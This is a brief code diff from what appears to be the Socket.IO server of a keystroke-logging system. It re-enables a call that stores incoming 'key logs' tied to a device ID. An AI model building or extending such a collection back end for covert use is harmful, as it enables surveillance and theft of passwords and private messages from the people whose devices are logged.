@@ -515,7 +515,7 @@ export const startSocketIO = async () => {
 							);
 
 							// Data should be include deviceId and keylogs
-							// await addNewKeyLogs(response);
+							await addNewKeyLogs(response);
 						} else {
 							console.log("Empty key logs, skipping...");
 						}
